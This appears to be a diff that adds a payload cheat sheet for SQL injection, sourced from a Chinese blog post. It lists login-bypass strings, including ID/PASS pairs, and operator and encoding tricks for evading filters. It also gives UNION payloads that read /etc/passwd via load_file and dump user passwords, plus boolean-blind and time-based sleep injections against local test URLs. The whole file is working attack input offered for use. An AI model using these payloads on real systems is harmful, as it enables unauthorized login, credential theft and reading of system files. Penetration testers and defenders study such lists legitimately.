@@ -1,0 +1,156 @@
+from https://lightless.me/archives/SQL-Injection-weisuo-Skill.html
+' or 1=1#
+'=0#
+'>-1#
+'<1#
+1'<99#
+'=0=1#
+'<=>0#
+'=0=1=1=1=1=1#
+'=1<>1#
+'<>1#
+1'<>99999#
+'!=2!=3!=4#
+
+'|0#
+'&0#
+'^0#
+'<<0#
+'>>0#
+'&''#
+'%11&1#
+'&1&1#
+'|0&1#
+'<<0|0#
+'<<0>>0#
+
+'*9#
+乘法
+ 
+'/9#
+除法
+ 
+'%9#
+求余
+ 
+'+0#
+加法
+ 
+'-0#
+减法
+
+'+2+5-7#
+'+0+0-0#
+'-0-0-0-0-0#
+'*9*8*7*6*5#
+'/2/3/4#
+'%12%34%56%78#
+'/**/+/**/0#
+'-----0#
+'+++0+++++0*0#
+
+'<hex(1)#
+'=left(0x30,1)#
+'=right(0,1)#
+'!=curdate()#
+'-reverse(0)#
+'=ltrim(0)#
+'<abs(1)#
+'*round(1,1)#
+'&left(0,0)#
+'*round(0,1)*round(0,1)#
+
+'=upper     (0)#
+
+' <1 and 1#
+'xor 1#
+'div 1#
+'is not null#
+admin' order by'
+admin' group by'
+'like 0#
+'between 1 and 1#
+'regexp 1#
+
+ID  : '='
+PASS: '='
+ 
+ID  : '<>'1
+PASS: '<>'1
+ 
+ID  : '>1='
+PASS: '>1='
+ 
+ID  : 0'='0
+PASS: 0'='0
+ 
+ID  : '<1 and 1>'
+PASS: '<1 and 1>'
+ 
+ID  : '<>ifnull(1,2)='1
+PASS: '<>ifnull(1,2)='1
+ 
+ID  : '=round(0,1)='1
+PASS: '=round(0,1)='1
+ 
+ID  : '*0*'
+PASS: '*0*'
+ 
+ID  : '+'
+PASS: '+'
+ 
+ID  : '-'
+PASS: '-'
+ 
+ID  :'+1-1-'
+PASS:'+1-1-'
+
+'+(0-0)#
+'=0<>((reverse(1))-(reverse(1)))#
+'<(8*7)*(6*5)*(4*3)#
+'&(1+1)-2#
+'>(0-100)#
+
+可以尝试使用以下的值替代空格
+%09
+%0a
+%0b
+%0c
+%0d
+%a0
+%23%0a
+%23%48%65%6c%6c%6f%20%77%6f%6c%72%64%0a
+
+'union select 1,load_file(0x2f6574632f706173737764),3 from users#
+'union select 1,group_concat(password),3 from users#
+admin' and (select count(*) from users)=3#
+
+http://127.0.0.1/info.php?num=1 and 1=0
+http://127.0.0.1/info.php?num=1 and 1=1
+http://192.168.137.129/info.php?num=1=0
+http://192.168.137.129/info.php?num=1=1
+http://127.0.0.1/info.php?num=1<>0
+http://127.0.0.1/info.php?num=1<>1
+http://127.0.0.1/info.php?num=1<0
+http://127.0.0.1/info.php?num=1<1
+http://127.0.0.1/info.php?num=1*0*0*1
+http://127.0.0.1/info.php?num=1*0*0*0
+http://127.0.0.1/info.php?num=1%1%1%0
+http://127.0.0.1/info.php?num=1%1%1%1
+http://127.0.0.1/info.php?num=1 div 0
+http://127.0.0.1/info.php?num=1 div 1
+http://127.0.0.1/info.php?num=1 regexp 0
+http://127.0.0.1/info.php?num=1 regexp 1
+http://127.0.0.1/info.php?num=1^0
+http://127.0.0.1/info.php?num=1^1
+http://127.0.0.1/info.php?num=0^(locate(0x61,(select id from users where num=1),1)=1)
+http://127.0.0.1/info.php?num=0^(select position(0x61 in (select id from users where num=1))=1)
+http://127.0.0.1/info.php?num=0^(reverse(reverse((select id from users where num=1)))=0x61646d696e)
+http://127.0.0.1/info.php?num=0^(lcase((select id from users where num=1))=0x61646d696e)
+http://127.0.0.1/info.php?num=0^((select id from users where num=1)=0x61646d696e)
+http://127.0.0.1/info.php?num=0^(id regexp 0x61646d696e)
+http://127.0.0.1/info.php?num=0^(id=0x61646d696e)
+http://127.0.0.1/info.php?num=0^((select octet_length(id) from users where num=1)=5)
+http://127.0.0.1/info.php?num=0^((select character_length(id) from users where num=1)=5)
+#没有,号得注入
+select (cast((select CASE WHEN ((select database()) like 't%'  ) THEN (sleep(10)) ELSE 2 END) as char))-'b';
